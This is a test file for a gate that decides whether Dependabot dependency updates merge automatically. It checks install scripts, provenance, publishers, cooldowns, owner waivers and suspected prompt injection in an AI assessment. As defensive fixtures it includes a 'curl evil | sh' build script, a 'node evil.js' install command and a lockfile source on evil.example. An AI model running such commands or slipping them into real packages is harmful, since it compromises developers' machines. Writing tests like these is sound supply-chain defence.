import { describe, it, expect } from 'vitest';
import {
  DEPENDABOT_COMMIT_EMAIL,
  REQUIRED_CHECKS,
  failedChecks,
  RULE_KIND,
  advisoryKeys,
  assessmentKey,
  classifyBump,
  classifyMain,
  decide,
  diffLockfiles,
  evaluateRules,
  diffTargets,
  latestCheckRuns,
  lockFingerprint,
  manifestChangeIsScoped,
  parseUpdatedDependencies,
  registryFact,
  escalationFingerprint,
  updatesKey,
  waiverKey,
} from '../../.github/deps-agent/gate.mjs';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import {
  MARKER,
  clampAssessment,
  decodeRecord,
  featureIssueTitle,
  neutralize,
  pushHistory,
  renderEscalation,
  renderRecord,
} from '../../.github/deps-agent/record.mjs';

const NOW = new Date('2026-10-23T12:00:00Z');
const ASSESSMENT_SCHEMA = JSON.parse(
  readFileSync(join(process.cwd(), '.github/deps-agent/assessment.schema.json'), 'utf8'),
);

/** Facts for a clean, mergeable patch bump; each test overrides one dimension. */
type Facts = Parameters<typeof evaluateRules>[0];

function cleanFacts(overrides: Record<string, unknown> = {}): Facts {
  return {
    author: 'dependabot[bot]',
    headCommit: { authorEmail: DEPENDABOT_COMMIT_EMAIL, verified: true },
    branch: 'dependabot/npm_and_yarn/zod-4.6.7',
    files: ['package.json', 'package-lock.json'],
    updates: [{ name: 'zod', type: 'direct:production', from: '4.4.3', to: '4.6.7' }],
    manifestScoped: true,
    checks: REQUIRED_CHECKS.map((name) => ({ name, status: 'completed', conclusion: 'success' })),
    lock: { added: [], newInstallScripts: [], changed: [] },
    registry: [
      {
        name: 'zod',
        version: '4.6.7',
        direct: true,
        publishedAt: '2026-10-01T00:00:00Z',
        prevAttested: true,
        attested: true,
        prevPublisher: 'colinhacks',
        publisher: 'colinhacks',
      },
    ],
    newAdvisories: [],
    malware: [],
    mergeable: true,
    fresh: true,
    main: 'healthy',
    assessment: { verdict: 'merge', codeReview: { coverage: 'full', suspicious: [] } },
    now: NOW,
    ...overrides,
  } as Facts;
}

/** A registry fact as the CLI builds it when the registry does not answer (same builder). */
const outageFact = (name: string, version: string, direct: boolean) =>
  registryFact({ name, from: null, to: version, direct, doc: null });

/** A version bump of a trusted install-script package, resolved from the registry. */
const ESBUILD_BUMP = {
  name: 'esbuild',
  from: '0.28.1',
  to: '0.28.2',
  installScript: true,
  resolved: 'https://registry.npmjs.org/esbuild/-/esbuild-0.28.2.tgz',
  bundled: false,
};

const statusOf = (facts: Facts, id: string) =>
  evaluateRules(facts).find((r) => r.id === id)?.status;
const keyOf = (facts: Facts, id: string) => {
  const rule = evaluateRules(facts).find((r) => r.id === id);
  return rule ? waiverKey(rule) : '';
};
const detailOf = (facts: Facts, id: string) =>
  evaluateRules(facts).find((r) => r.id === id)?.detail ?? '';
/** A 0.x minor bump: fails `semver` (no compatibility promise below 1.0). */
const SDK_BUMP = {
  name: '@anthropic-ai/sdk',
  type: 'direct:production',
  from: '0.115.0',
  to: '0.135.0',
};

const SOFT_RULES = Object.entries(RULE_KIND)
  .filter(([, kind]) => kind === 'soft')
  .map(([id]) => id);

/** `override: true` waives every soft rule as it fails now (the most an override can do). */
const outcome = (
  facts: Facts,
  opts: Partial<{
    mode: string;
    override: boolean;
    waived: Map<string, string>;
    slotFree: boolean;
  }> = {},
) => {
  const { override, ...rest } = opts;
  const rules = evaluateRules(facts);
  const everySoft = new Map(
    rules.filter((r) => SOFT_RULES.includes(r.id)).map((r) => [r.id, waiverKey(r)]),
  );
  return decide({
    rules,
    mode: 'merge',
    waived: override ? everySoft : new Map(),
    slotFree: true,
    ...rest,
  } as Parameters<typeof decide>[0]);
};

describe('classifyBump', () => {
  it('classifies ordinary patch, minor and major bumps', () => {
    expect(classifyBump('16.3.8', '16.3.9')).toBe('patch');
    expect(classifyBump('16.3.8', '16.4.2')).toBe('minor');
    expect(classifyBump('9.39.5', '10.13.0')).toBe('major');
  });

  it('treats a 0.x minor bump as major', () => {
    expect(classifyBump('0.115.0', '0.135.0')).toBe('major');
  });

  it('treats a 0.x patch bump as patch but any 0.0.x change as major', () => {
    expect(classifyBump('0.45.2', '0.45.4')).toBe('patch');
    expect(classifyBump('0.0.3', '0.0.4')).toBe('major');
  });

  it('treats prereleases and unparseable versions as major', () => {
    expect(classifyBump('1.2.3', '1.2.4-beta.1')).toBe('major');
    expect(classifyBump('1.2.3', 'latest')).toBe('major');
  });
});

describe('parseUpdatedDependencies', () => {
  it('reads every entry of a grouped Dependabot commit message', () => {
    const msg = [
      'chore(deps-dev): bump the dev-dependencies group with 2 updates',
      '',
      '---',
      'updated-dependencies:',
      '- dependency-name: pino-pretty',
      '  dependency-version: 13.2.0',
      '  dependency-type: direct:development',
      '  update-type: version-update:semver-minor',
      '- dependency-name: "@testing-library/dom"',
      '  dependency-version: 10.4.2',
      '  dependency-type: direct:development',
      '...',
    ].join('\n');
    expect(parseUpdatedDependencies(msg)).toEqual([
      { name: 'pino-pretty', type: 'direct:development', version: '13.2.0' },
      { name: '@testing-library/dom', type: 'direct:development', version: '10.4.2' },
    ]);
  });

  it('returns nothing for a hand-written commit', () => {
    expect(parseUpdatedDependencies('fix: something')).toEqual([]);
  });
});

describe('diffLockfiles', () => {
  it('reports added packages and newly introduced install scripts', () => {
    const base = {
      packages: { '': {}, 'node_modules/a': { version: '1.0.0' } },
    };
    const head = {
      packages: {
        '': {},
        'node_modules/a': { version: '1.0.1', hasInstallScript: true },
        'node_modules/b': { version: '2.0.0' },
      },
    };
    expect(diffLockfiles(base, head)).toMatchObject({
      added: ['b'],
      newInstallScripts: ['a'],
      changed: [
        {
          name: 'a',
          from: '1.0.0',
          to: '1.0.1',
          installScript: true,
        },
        {
          name: 'b',
          from: null,
          to: '2.0.0',
          installScript: false,
        },
      ],
    });
  });

  it('does not flag an install script that already existed on main', () => {
    const entry = { version: '1.0.0', hasInstallScript: true };
    const lock = { packages: { 'node_modules/esbuild': entry } };
    expect(diffLockfiles(lock, lock).newInstallScripts).toEqual([]);
  });
});

describe('assessment cache key', () => {
  const green = REQUIRED_CHECKS.map((name) => ({
    name,
    status: 'completed',
    conclusion: 'success',
  }));
  const red = green.map((c, i) => (i === 0 ? { ...c, conclusion: 'failure' } : c));
  const updates = [
    { name: 'zod', version: '4.6.7' },
    { name: '@types/node', version: '22.9.0' },
  ];
  const key = (over: Partial<Parameters<typeof assessmentKey>[0]> = {}) =>
    assessmentKey({ updates, checks: green, policyHash: 'abc', lockFingerprint: 'lock1', ...over });

  it('ignores the commit: same versions in any order give the same key', () => {
    expect(key({ updates: [...updates].reverse() })).toBe(key());
    expect(updatesKey(updates)).toBe('@types/node@22.9.0,zod@4.6.7');
  });

  it('changes when a version, the policy or the CI outcome changes', () => {
    expect(key({ updates: [{ name: 'zod', version: '4.6.8' }] })).not.toBe(key());
    expect(key({ policyHash: 'def' })).not.toBe(key());
    expect(key({ checks: red })).not.toBe(key());
    // A rebase that re-resolves the lockfile: the code review never saw the new versions.
    expect(key({ lockFingerprint: 'lock2' })).not.toBe(key());
  });

  it('fingerprints the introduced lockfile versions, in any order', () => {
    const a = { name: 'a', to: '1.0.0' };
    const b = { name: 'b', to: '2.0.0' };
    expect(lockFingerprint([a, b])).toBe(lockFingerprint([b, a]));
    expect(lockFingerprint([a, b])).not.toBe(lockFingerprint([a, { name: 'b', to: '2.0.1' }]));
  });
});

describe('diffLockfiles: introduced versions', () => {
  it('lists added and version-changed packages, including nested ones', () => {
    const base = {
      packages: {
        '': { version: '0.1.0' },
        'node_modules/a': { version: '1.0.0' },
        'node_modules/b': { version: '2.0.0' },
      },
    };
    const head = {
      packages: {
        '': { version: '0.1.0' },
        'node_modules/a': { version: '1.0.0' },
        'node_modules/b': { version: '2.1.0' },
        'node_modules/b/node_modules/@scope/c': { version: '3.0.0' },
      },
    };
    expect(diffLockfiles(base, head).changed.map((c) => `${c.name}@${c.to}`)).toEqual([
      '@scope/c@3.0.0',
      'b@2.1.0',
    ]);
  });
});

describe('diffLockfiles: one version at several places', () => {
  it('keeps the known previous version whatever the order the entries are read in', () => {
    const base = { packages: { 'node_modules/x': { version: '1.0.0' } } };
    for (const head of [
      {
        packages: {
          'node_modules/x': { version: '1.0.1' },
          'node_modules/y/node_modules/x': { version: '1.0.1' },
        },
      },
      {
        packages: {
          'node_modules/y/node_modules/x': { version: '1.0.1' },
          'node_modules/x': { version: '1.0.1' },
        },
      },
    ]) {
      expect(diffLockfiles(base, head).changed.find((c) => c.name === 'x')?.from).toBe('1.0.0');
    }
  });
});

describe('diffLockfiles: npm aliases', () => {
  it('looks an aliased package up under its published name', () => {
    const base = {
      packages: { 'node_modules/string-width-cjs': { version: '4.2.2', name: 'string-width' } },
    };
    const head = {
      packages: { 'node_modules/string-width-cjs': { version: '4.2.3', name: 'string-width' } },
    };
    expect(diffLockfiles(base, head).changed[0]?.name).toBe('string-width');
  });
});

describe('manifestChangeIsScoped', () => {
  const base = {
    scripts: { build: 'next build' },
    dependencies: { zod: '^4.4.3', next: '16.3.8' },
  };

  it('accepts a change limited to the declared dependency', () => {
    const head = { ...base, dependencies: { ...base.dependencies, zod: '^4.6.7' } };
    expect(manifestChangeIsScoped(base, head, ['zod'])).toBe(true);
  });

  it('rejects a change that also touches scripts', () => {
    const head = {
      scripts: { build: 'curl evil | sh' },
      dependencies: { ...base.dependencies, zod: '^4.6.7' },
    };
    expect(manifestChangeIsScoped(base, head, ['zod'])).toBe(false);
  });

  it('rejects a change to an undeclared dependency', () => {
    const head = { ...base, dependencies: { zod: '^4.6.7', next: '16.4.2' } };
    expect(manifestChangeIsScoped(base, head, ['zod'])).toBe(false);
  });
});

describe('evaluateRules + decide', () => {
  it('merges a clean patch/minor bump when the slot is free', () => {
    expect(outcome(cleanFacts())).toBe('merge');
  });

  it('only reports would-merge in shadow mode', () => {
    expect(outcome(cleanFacts(), { mode: 'shadow' })).toBe('would-merge');
  });

  it('queues a second mergeable PR in the same run', () => {
    expect(outcome(cleanFacts(), { slotFree: false })).toBe('queued');
  });

  it('escalates a 0.x minor bump, and the owner can override it', () => {
    const facts = cleanFacts({
      updates: [
        { name: '@anthropic-ai/sdk', type: 'direct:production', from: '0.115.0', to: '0.135.0' },
      ],
    });
    expect(statusOf(facts, 'semver')).toBe('fail');
    expect(outcome(facts)).toBe('escalate');
    expect(outcome(facts, { override: true })).toBe('merge');
  });

  it('escalates a PR not authored by Dependabot even with an owner override', () => {
    const facts = cleanFacts({ author: 'mallory' });
    expect(outcome(facts, { override: true })).toBe('escalate');
  });

  it('escalates files outside package.json/lockfile even with an override', () => {
    const facts = cleanFacts({ files: ['package.json', 'package-lock.json', 'src/proxy.ts'] });
    expect(statusOf(facts, 'files')).toBe('fail');
    expect(outcome(facts, { override: true })).toBe('escalate');
  });

  it('escalates the github-actions ecosystem', () => {
    const facts = cleanFacts({ branch: 'dependabot/github_actions/actions/checkout-7' });
    expect(outcome(facts)).toBe('escalate');
  });

  it('escalates a failed check even with an override', () => {
    const checks = REQUIRED_CHECKS.map((name) => ({
      name,
      status: 'completed',
      conclusion: name === 'Type-check' ? 'failure' : 'success',
    }));
    expect(outcome(cleanFacts({ checks }), { override: true })).toBe('escalate');
  });

  it('waits while a required check is still running or missing', () => {
    const checks = REQUIRED_CHECKS.slice(1).map((name) => ({
      name,
      status: 'in_progress',
      conclusion: null,
    }));
    const facts = cleanFacts({ checks });
    expect(statusOf(facts, 'checks')).toBe('pending');
    expect(outcome(facts)).toBe('wait');
  });

  it('escalates supply-chain signals: install scripts, provenance, publisher, advisories', () => {
    const reg = cleanFacts().registry[0];
    const cases = [
      cleanFacts({ lock: { added: [], newInstallScripts: ['node_modules/x'], changed: [] } }),
      cleanFacts({ registry: [{ ...reg, attested: false }] }),
      cleanFacts({ registry: [{ ...reg, publisher: 'someone-else' }] }),
      cleanFacts({ newAdvisories: ['GHSA-xxxx'] }),
      cleanFacts({
        lock: {
          added: Array.from({ length: 16 }, (_, i) => `p${i}`),
          newInstallScripts: [],
          changed: [],
        },
      }),
    ];
    for (const facts of cases) expect(outcome(facts)).toBe('escalate');
  });

  it('escalates a release younger than the cooldown or with unknown publish time', () => {
    const reg = cleanFacts().registry[0];
    expect(
      outcome(cleanFacts({ registry: [{ ...reg, publishedAt: '2026-10-22T00:00:00Z' }] })),
    ).toBe('escalate');
    expect(outcome(cleanFacts({ registry: [{ ...reg, publishedAt: null }] }))).toBe('escalate');
  });

  it('escalates suspected prompt injection even with an owner override', () => {
    const facts = cleanFacts({ assessment: { verdict: 'merge', injectionSuspected: true } });
    expect(statusOf(facts, 'injection')).toBe('fail');
    expect(outcome(facts, { override: true })).toBe('escalate');
  });

  it('escalates when CI finished but a required check never ran (renamed job)', () => {
    const checks = REQUIRED_CHECKS.slice(1).map((name) => ({
      name,
      status: 'completed',
      conclusion: 'success',
    }));
    expect(outcome(cleanFacts({ checks }))).toBe('escalate');
  });

  it('escalates a malware advisory even with an owner override', () => {
    const facts = cleanFacts({ malware: ['GHSA-8mgj-vmr8-frr6 (debug@4.4.2)'] });
    expect(statusOf(facts, 'malware')).toBe('fail');
    expect(outcome(facts, { override: true })).toBe('escalate');
  });

  it('waits when the malware feed is unavailable, even with an override', () => {
    const facts = cleanFacts({ malware: null });
    expect(statusOf(facts, 'malware')).toBe('pending');
    expect(outcome(facts, { override: true })).toBe('wait');
  });

  it('escalates suspicious code found in the package diff; the owner can override', () => {
    const facts = cleanFacts({
      assessment: {
        verdict: 'merge',
        codeReview: {
          coverage: 'partial',
          suspicious: [{ file: 'dist/index.js', finding: 'new fetch to an unknown host' }],
        },
      },
    });
    expect(statusOf(facts, 'codeReview')).toBe('fail');
    expect(outcome(facts)).toBe('escalate');
    expect(outcome(facts, { override: true })).toBe('merge');
  });

  it('escalates an assessment that skipped the code review', () => {
    expect(outcome(cleanFacts({ assessment: { verdict: 'merge' } }))).toBe('escalate');
  });

  it('escalates a release published 6 days ago (7-day cooldown)', () => {
    const reg = cleanFacts().registry[0];
    const facts = cleanFacts({ registry: [{ ...reg, publishedAt: '2026-10-17T12:00:00Z' }] });
    expect(statusOf(facts, 'cooldown')).toBe('fail');
  });

  it('waits for a young transitive version to age instead of escalating', () => {
    const reg = cleanFacts().registry[0];
    const transitive = {
      ...reg,
      name: 'debug',
      version: '4.4.2',
      direct: false,
      publishedAt: '2026-10-23T10:00:00Z', // two hours before NOW
    };
    const facts = cleanFacts({ registry: [reg, transitive] });
    expect(statusOf(facts, 'cooldown')).toBe('pending');
    expect(outcome(facts)).toBe('wait');
  });

  it('escalates a transitive version whose publish time is unknown', () => {
    const reg = cleanFacts().registry[0];
    const facts = cleanFacts({
      registry: [
        reg,
        { ...reg, name: 'debug', version: '4.4.2', direct: false, publishedAt: null },
      ],
    });
    expect(statusOf(facts, 'cooldown')).toBe('fail');
  });

  it('checks provenance on transitive versions but publisher on direct ones only', () => {
    const reg = cleanFacts().registry[0];
    const dep = { ...reg, name: 'ms', version: '2.1.4', direct: false };
    expect(
      statusOf(cleanFacts({ registry: [reg, { ...dep, attested: false }] }), 'provenance'),
    ).toBe('fail');
    expect(
      statusOf(cleanFacts({ registry: [reg, { ...dep, publisher: 'someone' }] }), 'publisher'),
    ).toBe('pass');
  });

  it('escalates a new version of a package that already runs an install script', () => {
    const lock = {
      added: [],
      newInstallScripts: [],
      changed: [{ name: 'better-sqlite3', from: '12.11.1', to: '12.12.0', installScript: true }],
    };
    const facts = cleanFacts({ lock });
    expect(statusOf(facts, 'installScripts')).toBe('fail');
    expect(evaluateRules(facts).find((r) => r.id === 'installScripts')?.detail).toContain(
      'better-sqlite3 12.11.1→12.12.0',
    );
  });

  it('fails a code review that saw nothing when there were diffs to review', () => {
    const blind = cleanFacts({
      assessment: { verdict: 'merge', codeReview: { coverage: 'none', suspicious: [] } },
    });
    expect(statusOf(blind, 'codeReview')).toBe('fail');
    expect(outcome(blind)).toBe('escalate');
  });

  it('accepts coverage none when no version change could be diffed (only new packages)', () => {
    const facts = cleanFacts({
      updates: [{ name: 'newpkg', type: 'direct:production', from: null, to: '1.0.0' }],
      assessment: { verdict: 'merge', codeReview: { coverage: 'none', suspicious: [] } },
    });
    expect(statusOf(facts, 'codeReview')).toBe('pass');
  });

  describe('trusted install scripts (option B, ADR-010)', () => {
    const CMD = JSON.stringify([null, 'prebuild-install || node-gyp rebuild --release', null]);
    const bump = (name: string, over: Record<string, unknown> = {}) => {
      const reg = cleanFacts().registry[0];
      return cleanFacts({
        lock: {
          added: [],
          newInstallScripts: [],
          changed: [{ name, from: '12.11.1', to: '12.12.0', installScript: true }],
        },
        registry: [
          reg,
          {
            ...reg,
            name,
            version: '12.12.0',
            direct: true,
            prevAttested: true,
            attested: true,
            prevInstallCmd: CMD,
            installCmd: CMD,
            ...over,
          },
        ],
      });
    };

    it('passes a trusted package whose install command is unchanged and attested', () => {
      const facts = bump('better-sqlite3');
      expect(statusOf(facts, 'installScripts')).toBe('pass');
      expect(evaluateRules(facts).find((r) => r.id === 'installScripts')?.detail).toContain(
        'better-sqlite3@12.12.0',
      );
    });

    it('escalates when the install command changed', () => {
      expect(
        statusOf(
          bump('better-sqlite3', { installCmd: JSON.stringify([null, 'node evil.js', null]) }),
          'installScripts',
        ),
      ).toBe('fail');
    });

    it('escalates when either version lacks provenance', () => {
      expect(statusOf(bump('better-sqlite3', { attested: false }), 'installScripts')).toBe('fail');
      expect(statusOf(bump('better-sqlite3', { prevAttested: false }), 'installScripts')).toBe(
        'fail',
      );
    });

    it('escalates a trusted package whose source repository changed', () => {
      const moved = bump('better-sqlite3', {
        prevRepo: 'github.com/wiselibs/better-sqlite3',
        repo: 'github.com/x/y',
      });
      expect(statusOf(moved, 'installScripts')).toBe('fail');
    });

    it('escalates a package that is not on the trusted list', () => {
      expect(statusOf(bump('sharp'), 'installScripts')).toBe('fail');
    });

    it('escalates a trusted package that gains a script it did not have', () => {
      const facts = bump('esbuild');
      const lock = { ...facts.lock, newInstallScripts: ['node_modules/esbuild'] };
      expect(statusOf({ ...facts, lock }, 'installScripts')).toBe('fail');
    });
  });

  describe('third review: what the gate must not pass', () => {
    const reg = () => cleanFacts().registry[0]!;

    it('waives only the soft rules the override names', () => {
      const facts = cleanFacts({ updates: [SDK_BUMP] });
      const semver = keyOf(facts, 'semver');
      expect(outcome(facts, { waived: new Map([['semver', semver]]) })).toBe('merge');
      // After a rebase, a new transitive version drops provenance: not covered, escalate.
      const later = cleanFacts({
        updates: [SDK_BUMP],
        registry: [
          reg(),
          { ...reg(), name: 'esbuild', version: '0.28.3', direct: false, attested: false },
        ],
      });
      expect(outcome(later, { waived: new Map([['semver', semver]]) })).toBe('escalate');
    });

    it('fails a head commit that is not a signed Dependabot commit, even with an override', () => {
      const unsigned = cleanFacts({
        headCommit: { authorEmail: DEPENDABOT_COMMIT_EMAIL, verified: false },
      });
      const human = cleanFacts({
        headCommit: { authorEmail: 'someone@example.com', verified: true },
      });
      expect(statusOf(unsigned, 'author')).toBe('fail');
      expect(statusOf(human, 'author')).toBe('fail');
      expect(outcome(human, { override: true })).toBe('escalate');
    });

    it('fails an introduced version that does not resolve from registry.npmjs.org', () => {
      // Built like production facts: through diffLockfiles on two lockfiles.
      const base = {
        packages: {
          'node_modules/x': {
            version: '1.0.0',
            resolved: 'https://registry.npmjs.org/x/-/x-1.0.0.tgz',
          },
        },
      };
      const withHead = (entry: Record<string, unknown>) =>
        cleanFacts({
          lock: diffLockfiles(base, {
            packages: { 'node_modules/x': { version: '1.0.1', ...entry } },
          }),
        });
      const git = withHead({ resolved: 'git+ssh://git@evil.example/x.git' });
      expect(statusOf(git, 'sources')).toBe('fail');
      expect(outcome(git, { override: true })).toBe('escalate');
      expect(
        statusOf(withHead({ resolved: 'https://registry.npmjs.org/x/-/x-1.0.1.tgz' }), 'sources'),
      ).toBe('pass');
      expect(statusOf(withHead({ inBundle: true }), 'sources')).toBe('pass'); // never fetched on its own
    });

    it('fails a version whose source repository changed, even though it is attested', () => {
      const moved = cleanFacts({
        registry: [
          { ...reg(), prevRepo: 'github.com/colinhacks/zod', repo: 'github.com/mallory/zod' },
        ],
      });
      expect(statusOf(moved, 'provenance')).toBe('fail');
      expect(evaluateRules(moved).find((r) => r.id === 'provenance')?.detail).toContain(
        'github.com/mallory/zod',
      );
    });

    it('waits, rather than escalating, when the npm registry is unreachable', () => {
      const down = cleanFacts({ registry: [outageFact('zod', '4.6.7', true)] });
      expect(statusOf(down, 'registry')).toBe('pending');
      expect(statusOf(down, 'publisher')).toBe('pass');
      expect(statusOf(down, 'provenance')).toBe('pass');
      expect(outcome(down)).toBe('wait');
    });

    it('waits during an outage even when a trusted install-script package is bumped', () => {
      const down = cleanFacts({
        lock: {
          added: [],
          newInstallScripts: [],
          changed: [ESBUILD_BUMP],
        },
        registry: [reg(), outageFact('esbuild', '0.28.2', false)],
      });
      expect(statusOf(down, 'installScripts')).not.toBe('fail');
      expect(outcome(down)).toBe('wait');
    });

    it('ignores a repository change on a version without provenance (free text, nothing to verify)', () => {
      const moved = cleanFacts({
        registry: [
          reg(),
          {
            ...reg(),
            name: 'ms',
            version: '2.1.4',
            direct: false,
            prevAttested: false,
            attested: false,
            prevRepo: 'github.com/vercel/ms',
            repo: 'github.com/vercel-labs/ms',
          },
        ],
      });
      expect(statusOf(moved, 'provenance')).toBe('pass');
    });
  });

  describe('eighth review', () => {
    it('fails hard when a bump introduces more versions than the agent can verify', () => {
      const huge = cleanFacts({ registryOverflow: 301 });
      expect(statusOf(huge, 'scale')).toBe('fail');
      expect(outcome(huge, { override: true })).toBe('escalate');
      expect(statusOf(cleanFacts(), 'scale')).toBe('pass');
    });

    it('keeps an overdue-cooldown waiver as the aging versions mature', () => {
      const youngOf = (name: string) => ({
        ...cleanFacts().registry[0]!,
        name,
        version: '1.0.1',
        direct: false,
        publishedAt: '2026-10-22T12:00:00Z',
      });
      const since = '2026-10-08T12:00:00Z'; // 15 days of waiting
      const both = cleanFacts({
        registry: [cleanFacts().registry[0]!, youngOf('a'), youngOf('b')],
        cooldownWaitSince: since,
      });
      const waived = new Map([['cooldown', keyOf(both, 'cooldown')]]);
      expect(outcome(both, { waived })).toBe('merge');
      // `a` turned 7 days old: the PR only got safer, so the waiver still applies.
      const matured = { ...youngOf('a'), publishedAt: '2026-10-01T00:00:00Z' };
      const one = cleanFacts({
        registry: [cleanFacts().registry[0]!, matured, youngOf('b')],
        cooldownWaitSince: since,
      });
      expect(outcome(one, { waived })).toBe('merge');
    });
  });

  describe('overdue cooldown', () => {
    const young = () => ({
      ...cleanFacts().registry[0]!,
      name: 'ms',
      version: '2.1.4',
      direct: false,
      publishedAt: '2026-10-22T12:00:00Z', // a day before NOW
    });
    const withYoung = (since: string | null) =>
      cleanFacts({ registry: [cleanFacts().registry[0]!, young()], cooldownWaitSince: since });

    it('waits while young transitive versions age, then fails once waiting is overdue', () => {
      expect(statusOf(withYoung(null), 'cooldown')).toBe('pending');
      expect(statusOf(withYoung('2026-10-15T12:00:00Z'), 'cooldown')).toBe('pending'); // 8 days
      const overdue = withYoung('2026-10-08T12:00:00Z'); // 15 days
      expect(statusOf(overdue, 'cooldown')).toBe('fail');
      expect(outcome(overdue)).toBe('escalate');
      // A failure can be waived (a pending rule never could): /deps merge works.
      expect(
        outcome(overdue, { waived: new Map([['cooldown', keyOf(overdue, 'cooldown')]]) }),
      ).toBe('merge');
    });
  });

  describe('fifth review: no waiver can hide an unchecked version or a new reason', () => {
    it('waits on a registry outage even when a waived cooldown failure hides it', () => {
      // A security update: zod published a day ago fails cooldown; the owner waived that.
      const young = { ...cleanFacts().registry[0]!, publishedAt: '2026-10-22T12:00:00Z' };
      const before = cleanFacts({ registry: [young] });
      const waived = new Map([['cooldown', keyOf(before, 'cooldown')]]);
      expect(outcome(before, { waived })).toBe('merge');
      // Next run: esbuild's packument times out. Nothing about esbuild was checked.
      const after = cleanFacts({
        lock: { added: [], newInstallScripts: [], changed: [ESBUILD_BUMP] },
        registry: [young, outageFact('esbuild', '0.28.2', false)],
      });
      expect(detailOf(after, 'cooldown')).toBe(detailOf(before, 'cooldown')); // the waiver still matches
      expect(statusOf(after, 'registry')).toBe('pending');
      expect(outcome(after, { waived })).toBe('wait');
    });

    it('does not let a verdict waiver cover a later escalation for a different reason', () => {
      const escalating = (question: string) =>
        cleanFacts({
          assessment: {
            verdict: 'escalate',
            summary: 's',
            escalation: { question, recommendation: 'r', options: [] },
            codeReview: { coverage: 'full', suspicious: [] },
          },
        });
      const first = escalating('Breaking change in parse()?');
      const waived = new Map([['verdict', keyOf(first, 'verdict')]]);
      expect(outcome(first, { waived })).toBe('merge');
      expect(outcome(escalating('New network call in the postinstall?'), { waived })).toBe(
        'escalate',
      );
    });
  });

  describe('fourth review: an override covers exactly what the owner saw', () => {
    const verdictFail = { id: 'verdict', detail: 'assessment: escalate' };

    it('does not let an override taken before the assessment cover what the assessment finds', () => {
      // The owner waived `verdict` as it failed then; the review now flags suspicious code.
      const suspicious = cleanFacts({
        assessment: {
          verdict: 'escalate',
          codeReview: {
            coverage: 'full',
            suspicious: [{ file: 'install.js', finding: 'fetches a remote script' }],
          },
        },
      });
      expect(
        outcome(suspicious, { waived: new Map([[verdictFail.id, waiverKey(verdictFail)]]) }),
      ).toBe('escalate');
    });

    it('treats a waived rule failing for a different reason as a new failure', () => {
      const facts = cleanFacts({ updates: [SDK_BUMP] });
      const detail = keyOf(facts, 'semver');
      expect(outcome(facts, { waived: new Map([['semver', detail]]) })).toBe('merge');
      expect(outcome(facts, { waived: new Map([['semver', 'something else']]) })).toBe('escalate');
    });

    it('never waives a rule that is only pending (not assessed yet)', () => {
      const unassessed = cleanFacts({ assessment: null });
      expect(
        outcome(unassessed, {
          waived: new Map([['verdict', waiverKey({ detail: 'not assessed yet' })]]),
        }),
      ).toBe('wait');
    });
  });

  it('escalates when no CI ran 60 minutes after the commit, and waits before that', () => {
    const late = cleanFacts({ checks: [], headCommittedAt: '2026-10-23T10:00:00Z' });
    const early = cleanFacts({ checks: [], headCommittedAt: '2026-10-23T11:30:00Z' });
    expect(statusOf(late, 'checks')).toBe('fail');
    expect(outcome(late)).toBe('escalate');
    expect(statusOf(early, 'checks')).toBe('pending');
  });

  it('escalates when the assessment says escalate, and waits when it is missing', () => {
    expect(outcome(cleanFacts({ assessment: { verdict: 'escalate' } }))).toBe('escalate');
    expect(outcome(cleanFacts({ assessment: null }))).toBe('wait');
  });

  it('does not let an owner override stand in for a missing assessment', () => {
    // Only failing rules can be waived: the review must run before anything merges.
    expect(outcome(cleanFacts({ assessment: null }), { override: true })).toBe('wait');
  });

  it('waits (does not escalate) on conflicts, stale lockfile or unhealthy main', () => {
    for (const facts of [
      cleanFacts({ mergeable: false }),
      cleanFacts({ mergeable: null }),
      cleanFacts({ fresh: false }),
      cleanFacts({ main: 'broken' }),
      cleanFacts({ main: 'pending' }),
    ]) {
      expect(outcome(facts)).toBe('wait');
      expect(outcome(facts, { override: true })).toBe('wait');
    }
  });
});

describe('latestCheckRuns', () => {
  it('keeps the most recent run of a re-run check', () => {
    const runs = [
      { id: 2, name: 'Lint', status: 'completed', conclusion: 'success' },
      { id: 1, name: 'Lint', status: 'completed', conclusion: 'failure' },
    ];
    expect(latestCheckRuns(runs)).toEqual([
      { name: 'Lint', status: 'completed', conclusion: 'success', completedAt: null },
    ]);
  });
});

describe('classifyMain', () => {
  const ci = { status: 'completed', conclusion: 'success', updated_at: '2026-10-23T11:50:00Z' };
  const deployed = { status: 'completed', conclusion: 'success' };

  it('is healthy only once CI and Deploy both succeeded (or Deploy was skipped)', () => {
    expect(classifyMain(ci, deployed, NOW).state).toBe('healthy');
    expect(classifyMain(ci, { ...deployed, conclusion: 'skipped' }, NOW).state).toBe('healthy');
  });

  it('is pending while CI or Deploy runs, broken when either fails', () => {
    expect(classifyMain(null, null, NOW).state).toBe('pending');
    expect(classifyMain({ ...ci, status: 'in_progress' }, null, NOW).state).toBe('pending');
    expect(classifyMain(ci, { status: 'in_progress', conclusion: null }, NOW).state).toBe(
      'pending',
    );
    expect(classifyMain({ ...ci, conclusion: 'failure' }, null, NOW).state).toBe('broken');
    expect(classifyMain(ci, { ...deployed, conclusion: 'failure' }, NOW).state).toBe('broken');
  });

  it('treats a Deploy that never started within 30 minutes as broken', () => {
    expect(classifyMain(ci, null, NOW).state).toBe('pending');
    expect(classifyMain({ ...ci, updated_at: '2026-10-23T11:00:00Z' }, null, NOW).state).toBe(
      'broken',
    );
  });
});

describe('classifyMain: no CI on main', () => {
  it('treats a main commit with no CI run 30 minutes after the push as broken', () => {
    expect(classifyMain(null, null, NOW, '2026-10-23T11:00:00Z').state).toBe('broken');
    expect(classifyMain(null, null, NOW, '2026-10-23T11:50:00Z').state).toBe('pending');
  });
});

describe('advisoryKeys', () => {
  it('collects advisory URLs and ignores transitive name-only references', () => {
    const report = {
      vulnerabilities: {
        a: { via: [{ source: 1, url: 'https://github.com/advisories/GHSA-1' }, 'b'] },
        b: { via: [{ source: 2, url: 'https://github.com/advisories/GHSA-2' }] },
      },
    };
    expect(advisoryKeys(report)).toEqual([
      'https://github.com/advisories/GHSA-1',
      'https://github.com/advisories/GHSA-2',
    ]);
  });
});

describe('ninth review: gate', () => {
  it('pings once for an overdue cooldown, even as aging versions mature', () => {
    const overdue = (list: string) => [
      {
        id: 'cooldown',
        kind: 'soft',
        status: 'fail',
        detail: `still not 7 days old: ${list}`,
        matchKey: 'cooldown:overdue',
      },
    ];
    expect(escalationFingerprint(overdue('a@1, b@1'))).toBe(escalationFingerprint(overdue('b@1')));
    const semver = [{ id: 'semver', kind: 'soft', status: 'fail', detail: 'x 1→2 (major)' }];
    expect(escalationFingerprint(semver)).not.toBe(
